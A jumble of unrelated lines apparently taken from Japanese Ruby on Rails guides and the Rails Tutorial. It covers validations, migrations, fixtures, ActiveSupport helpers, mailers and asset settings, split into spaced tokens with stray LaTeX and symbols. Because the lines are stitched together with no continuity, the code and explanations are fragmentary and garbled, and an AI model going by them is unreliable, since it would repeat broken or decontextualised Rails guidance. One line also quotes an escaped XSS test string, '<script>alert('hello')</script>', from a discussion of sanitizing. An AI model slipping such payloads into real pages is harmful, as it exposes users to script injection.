表 \ ref{table: valid _email _ regex } の 正規 表現 を 適用 し て \ kode {email } の フォーマット を 検証 し た 結果 を 、 リスト \ ref{ code : validates_format _of_email } に 示 し ま す 。
class  User  <  ActiveRecord : : Base
####  Class# class_eval を 使用 し て decorator パターン を 実装 する
上 は 以下 の よう に でき ま す 。
*  `mail `  -   実際 の メール ・ メッセージ で す ▟ ここ で は `: to ` ヘッダー と ` : subject ` ヘッダー を 渡 し て い ま す 。
fixture ファイル に ２人 目 の ユーザー を 追加 する
fixture は 、 関連 付け を 使 っ た オブジェクト の 作成 も サポート と し て い る
self を 省略 し た 結果 を リスト \ ref{ code : signin_form } に 示 し ま す 。
- 21 ▖ordinalize  # =>  " - 21st "
Capybara は \emph { Webrat } の 後続 プロジェクト で あ り 、 世界 \ href { http://en ▖wikipedia ▖org/wiki/ Capybara } { 最大 の 齧歯 類 } が 名前 の 由来 で す 。
たとえば 、 悪意 の あ る ユーザ が マイクロ ポスト の \ kode {user_ id } 属性 を 改変 し 、 別 の ユーザ に マイクロ ポスト を 関連 づけ る 事 も 可能 で す 。
Relationship モデル の バリデーション を テスト する
Active   Record オブジェクト を 出力 する ため の コンテナ 作成 方法 に は これ を 使 う こと を お 勧め し ま す ▟ この 方法 で あ れ ば 、 適切 な クラス と id 属性 が コンテナ に 追加 さ れ る から で す 。
たとえば 、 次 の よう な コード で は
*   him また は her  ->  them に 置き換え る
これ ら は Rails に よ っ て 挿入 さ れ て い る もの で 、 サーバー 上 で 変更 が あ っ た 場合 に ブラウザ が CSS を 再 読み込 み する の に 使用 し ま す ▟ )
この 時点 で サンプル アプリケーション は かなり 実用 的 に な っ て き ま し た が 、 まだ 重要 な 機能 が いく つ も 残 っ て い ま す 。
ユーザー の フォロワー 用 ページ の モックアップ
  else
Client▖ connection▖select_all ( " SELECT   first _ name ,   created_at   FROM   clients   WHERE   id   =   ' 1 ' " )
` rails  console ` の 出力 で 様子 を 観察 し て み ま す 。
` Hash# to_query ` メソッド は 、 それ ら の キー に 対 し て 名前 空間 を オプション で 与え る こと も でき ま す 。
厳密 な バリデーション
*  `config▖ console ` を 使用 する と 、 コンソール で ` rails  console ` を 実行 する 時 に 使用 さ れ る クラス を カスタマイズ でき ま す 。
initializer   " action_controller▖ set_helpers_ path "   do  | app |
これ ら の ファイル を 名前 空間 化 さ れ た ディレクトリ に 配置 する こと で 、 他 の エンジン や アプリケーション に 同じ 名前 の コントローラ が あ っ て も 名前 の 衝突 を 避け る 事 が でき ま す 。
ユーザー 登録 が 失敗 し た とき の モックアップ 。
### ` confirmation `
作成 し た コード を リスト \ ref{ code : following _ followers_ actions } に 示 し ま す
メール 送信 時 に テンプレート の レンダリング を スキップ し て メール 本文 を 単なる 文字 列 に し た く な る こと が あ り ま す 。
` : only_ integer ` を ` true ` に 設定 する と 、
/ login
` lock ` を 使用 する リレーション は 、 デッド ロック 条件 を 回避 する ため に 通常 トランザクション の 内側 に ラップ さ れ ま す 。
` parents ` メソッド は 、 レシーバ に 対 し て ` parent ` を 呼び出 し 、 `Object ` に 到着 する まで パス を さかのぼ り ま す 。
base_title
|                     |  50 5                | :http_ version _not _ supported      |
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/qualified_const ▖ rb ` で す 。
これ まで の 例 と 同様 、 \ kode {expect } を 使用 し て ブロック 内 の 操作 を まとめ 、 関連 する カウント を 1 増や し たり 減ら し たり する テスト を 行な っ て い ま す 。
### ` alias _ method_ chain`
" " ▖html_safe ?  
文字 列
      t ▖integer  : publisher_ id
検索 メソッド に 条件 を 追加 し た い 場合 、 たとえば ` Client ▖ w here ( " orders_count  =   ' 2 ' " ) ` の よう に 条件 を 単純 に 指定 する こと が でき ま す 。
class   CreateEmployees <  ActiveRecord : : Migration
完全 な コマンド
なお 、 本番 環境 で User モデル を 使 う ため に は 、 \ kode { heroku run } コマンド を 使 っ て Heroku 上 で も マイグレーション を 走 ら せ る 必要 が あ り ま す 。
#   Requires   supporting   ruby  files   with   custom matchers  and   macros ,  etc ,
User モデル に ユーザー 有効 化 メソッド を 追加 する
{ 0 } 図 6 ▖ 9 { / 0 }   { 1 } SQLite データベース \ kode {db / development ▖ sqlite 3 } に 登録 さ れ た ユーザー の 行 { / 1 }
#   automatically▖
これ に よ り 、 リスト \ ref{ code :index_ final _ refactoring } の コード は 極めて コンパクト に な り ま す 。
      invoke     active_ record
### `inquiry `
SELECT  *  FROM   clients  ORDER   BY  clients ▖ id   ASC   LIMIT   3
  <p >A  product   of  Danish   Design  during   the   Winter   of   ' 79 ▖ ▖▖</p>
通常 の アプリケーション と 異な る 点 は 、 これ ら の ディレクトリ の 下 に は さらに エンジン 名 を 持 つ サブ ディレクトリ が あ る こと で す 。
scaffold 生成 時 に は 、 さらに scaffolds ▖css   ( ` sass - rails `   gem が ` Gemfile ` で 有効 に な っ て い る 場合 は scaffolds ▖css ▖ scss )   も 生成 さ れ ま す 。
" active " ▖ inquiry ▖ inactive ?        
アセット は gem の 形式 で 外部 ソース から 持ち込 む こと も でき ま す 。
新し い Rails で は ` sanitize ` メソッド が 更新 さ れ 、 ` Loofah: : Scrubber ` を 使用 し て 強力 な スクラブ を 行な う こと が でき ま す 。
Linux の 場合 、 \ kode {apt- get } また は \ kode {yum } を 使用 し て 同様 に インストール でき ま す 。
Sessions ヘルパー は ビュー と コントローラ の 両方 で メソッド が 必要 と な る の で 、 コントローラ で は 上 の よう に 明示 的 に インク ルード する 必要 が あ り ま す 。
###  Action   Pack
たとえば offset ( 11 ) と 指定 する と 、 最初 の 11 レコード は スキップ さ れ 、 12 レコード 目 から 返 さ れ る よう に な り ま す 。
    mid dlewares  <<  [ Rails : : Rack : : Debugger ]   if  options [ : debugger ]
}▖╼╼\ subsection { 本章 の まとめ }  %  ( fold) ╼\ label{ sec : beginning _ what _we_learned_ in_this _ chapter }╼╼\ begin {itemize}╼╼\item 
get  ': controller ( /: action ( /:id ) ) '
@assembly  = @ part ▖ assemblies▖ create ( { assembly_ name :  " Transmis sion   housing " } )
*   エンジン を アプリケーション に フック する
{ 0 } 図 10 ▖ 15 { / 0 } { 1 } 新し い マイクロ ポスト を 作成 後 の Home ページ ▟ \ href { http://railstutorial ▖org / images/figures/micropost _created_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
アカウント 有効 化 メイラー の テキスト ビュー   ( 自動 生成 )
{ 0 } 図 11 ▖ 14 { / 0 }   { 1 } 試作 フィード の あ る Home ページ { / 1 }
  => false
現状 で は 、 有効 な 情報 で 送信 する と エラー が 発生 し て しま い ま す 。
  => " development "
HTML から HTML タグ を すべて 削除 し ま す ▟ HTML コメント も 削除 さ れ ま す 。
client ▖ save
種類 が `email ` の 標準 入力 フィールド を 作成 し ま す 。
以下 の 関連 付け を 例 に と っ て 考え て み ま しょ う 。
これ まで CD N が アセット を キャッシュ する の に 向 い て い る と 説明 し ま し た が 、 実際 に キャッシュ さ れ て い る の は アセット 単体 で は な く リクエスト 全体 で す 。
以下 は Basecamp で 実際 に 使用 さ れ て い る RSS 出力 コード を その まま 引用 し た もの で す 。
\ href { http://local host : 3000/about}{/about } で 表示 さ れ る About ページ
ブラウザ で ` doc/api/index▖html ` を 開 い て API ドキュメント を 参照 でき ま す 。
client▖ visits   + =   1
しかし 実際 に は 、 マイクロ ポスト を ユーザー と \emph { 関連 付け る   ( associate) }   必要 が あ る ため 、 ポスト の オーナー を 記録 する ため の \ kode {user_ id } も 追加 し ま す 。
ここ で は 、 説明 が 必要 と 思 わ れ る もの に つ い て のみ 補足 し ま す 。
ハッシュ は 配列 と 似 て い ま す が 、 1 つ の 重要 な 違い と し て 、 ハッシュ で は 要素 の 「 並び順 」 が 保証 さ れ な い と い う 点 が あ り ま す
ある コントローラ の アクション から 、 まったく 別 の コントローラ の 配下 に あ る テンプレート を 使用 し て 出力 する こと は 可能 で しょ う か 。
リスト \ ref{ code :html_structure } の とき
さらに 、 与え られ た パスワード を セキュア に 認証 でき る よう に し ま し た 。
Active   Record の オブジェクト は ハッシュ や ブロック から 作成 する こと が でき ま す ▟ また 、 作成 後 に 属性 を 手動 で 追加 でき ま す 。
###  計算
プロファイル に は 、 図 \ ref { fig : profile_follow_button } および 図 \ ref { fig : profile_unfollow_button } の よう に それぞれ   [ Follow ] 、 [Unfollow ]   ボタン が 表示 さ れ ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :carrier_ wave_configuration } に 示 し ま す 。
たとえば 、 この コンソール セッション で ネイティブ の Ruby オブジェクト に \ kode {send } メソッド を 実行 し て 、 配列 の 長 さ を 得 る と し ま す 。
<% =  ren der   partial :   " customer " ,  object : @new_ customer  %>
パスワード を 除外 する アプリケーション フィルタ を 追加 する に は ` config/initializers/filter_ parameter_ logging ▖ rb ` を ` config ▖filter_ parameters + = [ : password ] ` に 追加 し ま す 。
d ▖ next _ year               # =>  Sun ,   0 8   May  2011
{ 0 } 図 1 ▖ 11 { / 0 } { 1 } 見事 な Heroku の インターフェイス ▟ \ href { http://railstutorial ▖org / images/figures/heroku_ info _ 4 _ 0 - full ▖ png } { ( 拡大 ) } { / 1 }
現 時点 で は 、 新し い マイクロ ポスト の 作成 は 図 \ ref { fig : micropost _created } で 示 し た よう に 期待 どおり に 動作 し て い ま す 。
client  =  Client ▖ first ( 3 )
* * 楽観 的 ロック カラム * *
上 の コード の 出力 は 以下 の よう な もの に な り ま す 。
インスタンス 変数 は 常 に \ kode {@} 記号 で 始ま り 、 未 定義 の 状態 で は 値 が \ kode {nil } に な り ま す 。
フィクスチャ で \ kode {user } 変数 を 定義 する
Client ▖ w here ( first _ name :  'Lifo') ▖take
有効 な User か どう か を テスト する
なお 、 \emph { Rails チュートリアル } で は 、 \ kode {\_ path } 書式 を 使用 する 一般 的 な 規約 に 従 い 、 リダイレクト の 場合 のみ \ kode {\_url} 書式 を 使用 し ま す 。
\ kode {w here } メソッド 内 の 変数 に 、 キー と 値 の ペア を 使 う  
╼  |  Ruby   on   Rails   Tutorial   Sample  App
My SQL アダプター を 使用 する と 、 以下 の 設定 オプション が 1 つ 追加 さ れ ま す 。
以下 の 最初 の 行 は 、
特定 の 条件 を 満た す 場合 に のみ バリデーション を 実行 し た い 場合 が あ り ま す 。
` secrets▖yml ` ファイル を ` config ` フォルダ 内 に 作成 し 、 以下 の 内容 を 追加 し ま す 。
*  ` ENV [ " RAILS _ CACHE _ ID " ] ` と ` ENV [ " RAILS _ APP _ VERSION " ] ` は 、 Rails の キャッシュ を 扱 う コード で 拡張 キャッシュ を 生成 する ため に 使用 さ れ ま す 。
Rails の コントローラ は 必ず \ kode { Application Controller } を 継承 し て い る の で 、 Application コントローラ で 定義 し た ルール は 、 アプリケーション の すべて の アクション に 反映 さ れ ま す 。
### ` has_many ` 関連 付け の 詳細
既に この 共有 フォルダ を 使用 し て い る の で あ れ ば 、 独自 の デプロイ 用 タスク を 作成 する 必要 が あ り ま す 。
SELECT  *  FROM   comments   WHERE   article _ id   =   10   ORDER   BY  posted_at   DESC
ただし 、 ` form _ for ` を 使用 し て リソース を 更新 し て お り 、 ` PUT `  HTTP メソッド を 使用 する カスタム ルーティング と 連動 し て い る の で あ れ ば 、 変更 が 必要 で す 。
この 順序 を テスト する ため に 、 次 の よう に マイクロ ポスト を いく つ か 作成 し て お き ま す 。
#   Rails   3 ▖ 1 から jQuery が デフォルト の Java Script ライブラリ に な る
Rails の メイラー は 、 ビュー の レンダリング と 本質 的 に 同じ こと を 行 っ て い ま す 。
### button_to
ユーザー の サイン アウト を テスト する 。
  <% end   %>
次 に diff を 展開 し ま す 。
< section >
" hello " ▖ to ( 10 )   # =>  " hello "
これ に 対応 する アプリケーション コード を 作成 する に は 、 \ kode {belongs_to } リレーションシップ を 普段 と 同様 に 作成 し ま す 。
この 節 で は 、 その サイン アウト 機能 を 追加 し ま す 。
上 の 変更 を 行な う こと で 、 あたかも エンジン が アプリケーション の 一部 で あ る か の よう に 、 エンジン の コントローラ で ` Application Controller ` に アクセス でき る よう に な り ま す 。
\ kode {user } と 紐付け た 新し い Relationship オブジェクト を 返 す
config▖ active_ record ▖ schema_format  = : ruby
╼╼\ subsection { 本章 の まとめ }  %  ( fold) ╼\ label{ sec : activation_resets_ what _we_learned_ in_this _ chapter }╼╼\ begin {itemize}╼╼\item 
Keep- Alive :  timeout = 15 ,   max = 100            リダイレクト 先 の ページ と し て 表示 さ れ る ]
# =>  Sun   Mar   28   0 3 : 0 0 : 0 0   + 0200   2010
接続 でき な い 場合 は 、 ` development ` セクション の ユーザー 名 また は パスワード を 適切 な もの に 変更 し て くださ い 。
config▖ action _mailer▖ delivery _ method  = :sendmail
上 の コード は 以下 を 実行 し ま す 。
     maximum :   400 ,
NOTE :   Rails で データ 保存 用 に SQLite 3 データベース が 採用 さ れ て い る の は 、 設定 なし で すぐ に 使用 でき る から で す 。
####  アプリケーション の コントローラ を 使用 する
SP 1 ,  Firefox  v 2 ▖ 0 ▖ 0 ▖ 5   and   Opera   9 ▖ 5 ▖   Safari は まだ この フラグ を 検討 中 で あ り 、 この オプション は 無視 さ れ ま す 。
` : instance_ accessor ` を `false ` に 設定 する と 、 モデル の 属性 設定 時 に マス アサインメント を 防止 する の に 便利 で す 。
実際 、 ` cattr_*` マクロ は 単なる ` mattr_*` マクロ の 別名 で す 。
結果 を リスト \ ref{ code :length_ validation_test } に 示 し ま す 。
|                     |  511                | : network _ authentication_required  |
   validates : name ,  uniqueness: {  case_sensitive :  false   }
=>  " user@ example ▖ com "
    mattr_accessor   :loaded
ここ で は ビュー の \ kode {<title > } タグ の 内容 を 変更 し ま す 。
ある アプリケーション の ` User ` モデル に ログ イン 情報 が あ り 、 それ に 関連 する 名前 など の 情報 は ` Profile ` モデル に あ る と し ま す 。
この オプション を 使用 する 場合 は 、 必ず ` : content_type ` オプション も 指定 し て くださ い 。
=>  " foo@bar▖ com "
Active   Record を 使 う と 、 データ モデル を 作成 し たり 操作 し たり する ため の 多数 の メソッド が 使え る よう に な る
今度 は ID が 無効 な 場合   ( = ユーザー が 存在 し な い 場合 )   に も メソッド は 例外 を 発生 せ ず 、 \ kode {nil } を 返 し ま す 。
ブロック が 渡 さ れ た 場合 は yield し ま す 。
いつ も の よう に 、 以下 を 実行 し て テスト スイート が   \ passing \   に な る こと を 確認 し て から 先 に 進 み ま しょ う 。
OS   X 用 の ネイティブ クライアント と し て は \ href { http://colloquy ▖ info /}{Colloquy } と \ href { http://limechat▖ net/mac/}{ LimeChat } が お 勧め で す 。
   default   from : 'notifications @example ▖ com'
` config▖ active_ record ` に は 多く の オプション が 含 ま れ て い ま す 。
A   schematic   representation   of  the   model- view-controller   ( MVC )   architecture▖
代り に アセット パイプライン 機能 を ご 利用 くださ い 。
リスト \ ref{ code : layout_new_structure } の レイアウト は その 目的 を 果た し て い ま す が 、 少々 散らか っ て い ま す 。
*  `collection ▖ size`
create     test/controllers/blorgh/ comments_controller_test ▖ rb
#   コメント 行
user 	 0 m 1 ▖ 259 s
この ヘッダ の おかげ で 、 アセット で 変更 が 発生 し て い な い 場合 に ブラウザ が CSS や Java Script を リクエスト の たび に 再度 ダウンロード せ ず に 済 み 、 非常 に 有用 で す 。
 |  Ruby   on   Rails   Tutorial   Sample  App
` first ` メソッド で 返 す レコード の 最大 数 を 数値 の 引数 で 指定 する こと も でき ま す 。
|                     |  50 7                | : insufficient_storage            |
Users コントローラ と User モデル の 関係 を さらに 考察 する ため に 、 リスト \ ref{ code : demo_ index_ action } で \ kode {index } アクション を 整理 し て み ま し た
セキュリティ モデル を 確認 する ため に before フィルター を コメント アウト する   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
###   結合 さ れ た テーブル で 条件 を 指定 する
これ は つまり 、 以下 の 行 は
実際 の インデックス ページ を 作成 する に は 、 ユーザー を 列挙 し て ユーザー ごと に \ kode { li } タグ で 囲 む ビュー を 作成 する 必要 が あ り ま す 。
--------------------
Ruby   1 ▖ 9 系 を 使用 する 場合 、 Ruby   1 ▖ 9 ▖ 1 は あからさま な セグメンテーション 違反 が 発生 する ため 使用 でき ま せ ん ▟ 1 ▖ 9 ▖ 3 を ご 使用 くださ い 。
特に 、 以下 の 値 は 、
ページ タイトル を カスタマイズ せ ず に 表示 する Home ページ  
ブロック 内 で これ ら を 使用 し て データ が 正し い か どう か を 自由 に チェック でき ま す 。
( Windows 上 で 動作 する 同様 の ソフト に \ href { http://github▖ com/vertiginous/pik} { Pik } が あ り ま す ▟ )
<% =  ren der " blorgh/ comments/form "   %>
実 は 、 ` save ` に ` validate:  false ` を 引数 と し て 与え る と 、 ` save ` の バリデーション を スキップ する こと が でき て しま い ま す 。
 |  Ruby   on   Rails   Tutorial   Sample  App
*  `config▖ log _ formatter ` は Rails ロガー の フォーマット を 定義 し ま す 。
これ は リスト \ ref{ code : log _out _ method } で 使用 さ れ て い ま し た 。
` head ` メソッド に は 、 HTTP ステータス コード を 示 す 多く の シンボル を 引数 と し て 指定 でき ま す   ( [ 参照 テーブル ] ( #status オプション )   参照 ) 。
Content- Type :  text / css
で は ここ で マイクロ ポスト を 追加 し ま しょ う 。
    get   'welcome/index'
` gem  'spring ' , group : : development `  を  ` Gemfile ` に 追加 する
（ 出力 結果 が 長 い の で 、 省略 さ れ た 部分 を 示 す ため に 縦点 を 使 っ て い ま す ▟ ）
オブジェクト の 個別 の 属性 に つ い て エラー が あ る か どう か だけ を 調べ ま す 。
これ に よ り コール バック が 利用 でき る の で 、 ジョブ の ライフ サイクル の 間 に 特定 の ロジック を トリガ でき ま す 。
この メソッド は 、 キー と 値 の いずれ に つ い て も 、 必要 な 箇所 を すべて エスケープ し ま す 。
ここ で 、 有効 化 トークン と メール を それぞれ   \ kode { params [ : id ] } と  \ kode { params [ :email ] } で 参照 でき る   ( \ ref{ sec : account_activation_mailer} )   こと を 思い出 し て み ま しょ う 。
たとえば 4 - 0 - stable ブランチ に 切り替え る 場合 は 以下 の よう に し ま す 。
この 実装 結果 を リスト \ ref{ code : authenticated_p } に 示 し ま す 。
と は い え 、 今回 必要 と な る アイデア の ほとんど は 、 \ ref{ sec : showing_ all_users } で 実装 し た ユーザー を 表示 する 部分 と 似 て い ま す 。
オブジェクト は まだ データベース に 保存 さ れ て い な い ため 、 生成 さ れ る SQL は 以下 の よう な もの に な り ま す 。
( パスワード の 存在 検証 と 確認 は \ kode { has_ secure_ password } に よ っ て 自動 的 に 追加 さ れ ま す ▟ )
User モデル を 生成 する
#   If  the argument   is  false   ( default   is   + nil + ) ,   the  context   is
驚 く か も しれ ま せ ん が 、 上 の コード で は 、 \ kode { a } が 逆転 し た だけ で は な く 、 \ kode { b } まで 逆転 さ れ て しま っ て い ま す 。
###  値 の 操作
( カスタム 画像 を 扱 う 方法 に つ い て は \ ref{ sec : micropost _ images } で 扱 い ま す ) 。
   # => [ " Name は 以下 の 文字 を 含 む こと は でき ま せ ん   !
これ ら の オプション は 標準 の 方法 で ローカライズ でき ま す ▟ 使用 する キー は 以下 の とおり で す 。
` require_tree ` ディレクティブ は 、 指定 さ れ た ディレクトリ 以下 の  _ すべて の _  Java Script ファイル を 再帰 的 に インク ルード し 、 出力 に 含め ま す 。
GET  /patients/17
エラー が 表示 さ れ た Home ページ
テンプレート 内 の 1 つ の ブロック の 実行 時間 測定 と 、 結果 の ログ 出力 に 使用 し ま す 。
| Gemfile<br> Gemfile ▖ lock | これ ら の ファイル は 、 Rails アプリケーション で 必要 と な る gem の 依存 関係 を 記述 し ま す 。
div に 続 い て 、 埋め込 み Ruby コード が 出現 し ま す 。
追伸 ▟ エンジン 機能 は James   Adam 、 Piotr  Sarnacki 、 Rails コア チーム 、 そして 多く の 人々 の 助け なし で は できあが ら な かっ た で しょ う 。
もし 今 の 時点 で データベース の ロール バック を 実行 し て い た 場合 は 、 先 に 進 む 前 に もう 一 度 以下 の よう に マイグレーション を 適用 し て 元 に 戻 し て くださ い 。
#### ` classify`
Rails   4 ▖ 0 で は ` assets ` グループ が Gemfile から 削除 さ れ ま し た 。
メール アドレス の 小 文字 変換 に 対 する テスト は 演習 と し て 残 し て お き ま す   ( \ ref{ sec : exercises_uniqueness_validation } ) 。
\ kode { box_ sizing } ミックス イン を リスト \ ref{ code : mixin_and_debug } から 再 利用 し て い る こと に 注目 し て くださ い 。
実 は もう ひと つ 地味 な 問題 が あ り ま す ▟ ある 理由 に よ っ て 、 テスト 内 で は \ kode {cookies } メソッド に シンボル を 使用 でき な い の で す ▟ その ため 、
{ 0 } 図 8 ▖ 7 { / 0 } { 1 } フラッシュ メッセージ が 消え ず に 残 っ て い る 例 ▟ \ href { http://railstutorial ▖org / images/figures/flash_persistence_ bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
` include_seconds ` を true に する と 、 より 詳細 な 差 を 得 られ ま す 。
*  `ren der  : body ` を 実行 し た 場合 、 content type ヘッダー は 「 設定 さ れ な い 」
日時 を 移動 する 最も 一般 的 な 方法 は ` advance ` メソッド を 使用 する こと で す 。
\emph {Sass }  は 、 スタイル シート を 記述 する ため の 言語 で あ り 、 CSS に 比べ て 多く の 点 が 強化 さ れ て い ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : sign_in_helper } に 示 し ま す 。
TIP :   特に 記 さ な い 限り 、 モデル 中 の ` id ` は 主 キー を 表 し ま す 。
これ は リスト \ ref{ code : admin _specs } で 使用 さ れ て い ま し た 。
これ より 古 い Ruby の サポート は 公式 に 停止 し て い ま す 。
この 作業 は 2 つ に 分け る の が 自然 で す ▟ 最初 に 、 ユーザー を メール アドレス で 検索 し ま す ▟ 次 に 、 受け取 っ た パスワード で ユーザー を 認証 し ま す 。
これ は リスト \ ref{ code :remember_me_ checkbox } で 使用 さ れ て い ま し た 。
継承 階層 を 図 \ ref { fig: string _ inheritance_ ruby _ 1 _ 9 } に 示 し ま す 。
この よう に 、 メソッド 呼び出し で の 変数 代入 を 記憶 し て 次回 以降 の 呼び出し で 使い回 す 手法 を \ href { http://en ▖wikipedia ▖org/wiki / Memoization}{\emph { メモ 化   ( memoization ) }}  と 呼 び ま す 。
=> " Michael "
単一 の テスト を 個別 に 実行 する こと も でき ま す 。
呼び出 し た い ` Proc ` オブジェクト を ` : if ` や `:unless ` で 使用 する こと も でき ま す 。
*   [ Ruby プログラミング 言語 公式 Web サイト の 情報 ] ( https://www ▖ruby - lang ▖ org /ja/documentation/ )
クラウド IDE を お 使 い の 場合 は 「 Goto   Anything 」 コマンド   ( ファイル 名 の 一部 を 入力 する だけ で その 場所 に ジャンプ する )   が 重宝 し ま す 。
次 に 、 いつ も の よう に 以下 を 実行 し ま す 。
\ kode { create_table } メソッド は ブロック 変数 を 1 つ 持 つ ブロック   ( \ ref{ sec :blocks})   を 受け取 り ま す ▟ ここ で は   ( “ table ” の 頭 文字 を 取 っ て )   \kode {t } で す 。
本 ガイド で は 、 コア 拡張 機能 と し て 定義 さ れ て い る すべて の メソッド に つ い て 、 その 定義 ファイル の 置き 場所 も 示 し て あ り ま す 。
上 の SQL を 日本 語 で 書 く と 「 記事   ( article )   の あ る すべて の カテゴリー を 含 む 、 Category オブジェクト を 1 つ 返 す 」 と な り ま す 。
class   D  <  C ; end
で は 、 リスト \ ref{ code : generate_user_ model } で User モデル を 生成 し た とき と 同様 に 、 Rails の \ kode { generate  model } コマンド を 使 っ て Micropost モデル を 生成 し て み ま す 。
####  サブ ディレクトリ に デプロイ する 場合 の 検討 事項
" application - 1 c 5752 7 8 95 88 ac 18 d 7 e1 a50 b 1 f 0 fd 4 c 2 ▖ css " ,
# ` mod _expires ` モジュール を 有効 に する 必要 あ り
これ に よ り 、 ページ の コンテンツ と タイトル の 両方 に ユーザー の 名前 が 含 ま れ て い る か どう か を テスト でき ま す 。
    @ logger ▖ debug ( format_ log_entry ( name ,  sql▖ squeeze ( ' ')))
$  rake  railties:install : migrations
` beginning _ of_quarter ` メソッド と ` end _of_quarter ` メソッド は 、 レシーバ の カレンダー の 年 に お け る 四半 期 の 最初 の 日 と 最後 の 日 を それぞれ 返 し ま す 。
私 たち は この 手法 を 「 控えめ な Java Script 」 と 呼 ん で い ま す ▟ この 名称 は 、 HTML の 中 に Java Script を 混入 さ せ な い と い う 意図 に 由来 し て い ま す 。
       Contents
### ` new ` セグメント や ` edit ` セグメント を オーバーライド する
「 先 に Ruby を 勉強 し て から Rails を 学 ぶ 方 が 良 い で しょ う か ？ 」 と い う 質問 を よく 受け ま す 。
CSS や Java Script の 圧縮 設定 に は あらゆる オブジェクト を 設定 でき ま す 。
ただし 、 ` config/ database▖yml ` など に 置 か れ る データベース 接続 設定 や 、 ` config/ secrets▖yml ` など に 置 か れ る サーバーサイド の 秘密 キー の セキュリティ は 保 つ よう に し て くださ い 。
すぐ に も マイクロ ポスト 一覧 の 実装 に 取りかか り ま す が 、 その 前 に 注意 す べ き 点 が いく つ か あ り ま す 。
マイクロ ポスト の 存在 確認 バリデーション の 結果
( { 0 } { 1 } 第 7 章 { / 1 } { / 0 } で もっと 便利 な メソッド を 紹介 し ま す )
    socket: /tmp/mysql▖ sock
# =>  Tue ,   0 8   Jun  2010   0 1 : 0 0 : 0 0   + 0000
以上 で ユーザー インデックス ページ は 完全 に 機能 する よう に な り ま し た の で 、 以下 の テスト は すべて パス する はず で す 。
イニシャライザ を 使用 する こと で 、 アプリケーション の 設定 は アプリケーション が 起動 し て エンジン の モデル を 呼び出 す まで に 完了 し ま す ▟ この 動作 は 既存 の この 設定 に 依存 する 場合 が あ り ま す 。
`@employee▖ pictures ` と する と 、 写真 の コレクション を ` Employee ` モデル の インスタンス から 取得 でき ま す 。
ページ を ブラウザ で 再 表示 する と 、 先 に 図 に 示 し た フォーム の 例 の とおり に フォーム が 表示 さ れ ま す 。
この 章 で は 、 最初 の アプリケーション を Heroku に デプロイ し ま す 。
最初 は 、 現在 定義 さ れ て い る 変数 を 変更 する と い う ありふれ た コード に つ い て 説明 し ま す 。
従 っ て 、 エンジン と アプリケーション は 、 細か な 違い を 除 け ば ほぼ 同じ もの で あ る と 考え て いただ い て よ い で しょ う ▟ 本 ガイド で も この 点 を たびたび 確認 し ま す 。
最初 の 例 で は 、 ` in_groups_of ` メソッド は 最後 の グループ を なるべく ` nil ` 要素 で 埋め 、 指定 の サイズ を 満た す よう に し て い ま す 。
Rails スタック
self を 省略 し た 結果 を リスト \ ref{ code :sessions _helper_authenticate } に 示 し ま す 。
  => " test "
典型 的 な マニフェスト ファイル の 内容 は 以下 の よう な 感じ に な っ て い ま す 。
### `pluck `
筆者 は この よう な 場合 、 代入 式 全体 を かっこ で 囲 む よう に し て い ま す ▟ これ が 比較 で な い こと を 思い出せ る よう に する ため で す 。
order _ ids
self を 省略 し た 結果 を リスト \ ref{ code : generalized_ current_user } に 示 し ま す 。
` video_tag ` の 場合 と 同様 、 ` audio _tag ` に も 以下 の 特殊 オプション が あ り ま す 。
正し い スペル を 使用 する こと   ( Arel 、 Test : :Unit 、 RSpec 、 HTML 、   My SQL 、 Java Script 、 ERB など ) ▟ 大 文字 小 文字 に も 注意 する こと 。
対応 する アプリケーション コード を 作成 する 。
### `numericality `
default _scope は 引数 に 無名 関数   (->)   を 取 る
保存 さ れ た 変数 は 、 テンプレート や レイアウト の どんな 場所 で も 自由 に 使用 でき ま す 。
*  `config▖ action_controller▖ allow _ forgery _ protection ` は 、 CSRF 保護 を オン に する か どう か を 指定 し ま す 。
( 実際 は どちら で も 動作 し ま す が 、 この 文脈 で は 内挿 と 考え る 方 が 筋 が 通 っ て い ま す ) 。
処理 さ れ る ファイル で アセット パイプライン の require ステートメント を 使用 し て 、 これ ら の アセット が 他 の アセット に 依存 する こと を 指定 する こと も でき ま す 。
    errors▖ add(:customer_ id ,   " is   not   active " )  unless  customer▖ active ?
ログ イン 失敗 時 の 処理 を 扱 う   ( 誤り あり )
最初 に \ href { http://api ▖ heroku▖ com/signup } { Heroku で ユーザー 登録 } し ま す 。
|   モデル   /  クラス   |   テーブル   /  スキーマ   |
1 ▖ordinalize    # =>  " 1st "
{ 0 } 図 3 ▖ 4 { / 0 }   { 1 } 修正 さ れ た Help ページ { / 1 }
テスト の 準備 が 完了 し た の で 、 いよいよ サイン インフォーム の 開発 に 取りかか り ま しょ う 。
リスト \ ref{ code : gitignore } の とき
フィルタ から 返 さ れ る 「 " some&lt; script&gt; alert ( 'hello') &lt;/ script&gt ; 」 と い う 文字 列 の 攻撃 能力 は 温存 さ れ て い ま す 。
Ruby は コメント の 内容 を 実行 する こと は あ り ま せ ん が 、 適切 な コメント は それ を 読 む 人間 に と っ て   ( コード の 作者 に と っ て も )   非常 に 有用 で す 。
` as ` オプション は 、 ローカル 変数 の 名前 を 変更 し た い 場合 に 使用 し ま す 。
以下 の よう な 結果 が 生成 さ れ ま す 。
ブラウザ から の `/photos/ show / 1 / 2 ` パス は ` Photos ` コントローラ の ` show ` アクション に 割り当て られ ま す 。
Spork 、 RubyTest の 面倒 な 設定 は 、 なるべく 後回し に する か 廃止 し ま し た 。
フォロー と フォロー 解除 は それぞれ リレーションシップ の 作成 と 削除 に 対応 し て い る ため 、 まず は Relationships コントローラ が 必要 で す ▟ いつ も の よう に コントローラ を 生成 し ま しょ う 。
person ▖errors▖empty?  
\ kode { followed_users } ページ と \ kode { followers } ページ を テスト する 。
その 気 に な れ ば 、 ブラウザ の cookies を ブラウザ で 直接 調べ て 結果 を 確認 する こと も でき ま す   ( 図 \ ref { fig: cookie_ in_browser } )
以下 の 例 で は
英数字 、 アンダース コア   (\_) 、 プラス   ( + ) 、 ハイフン   (-) 、 ドット   ( ▖)   の いずれ か を 少な く とも 1 文字 以上 繰り返 す
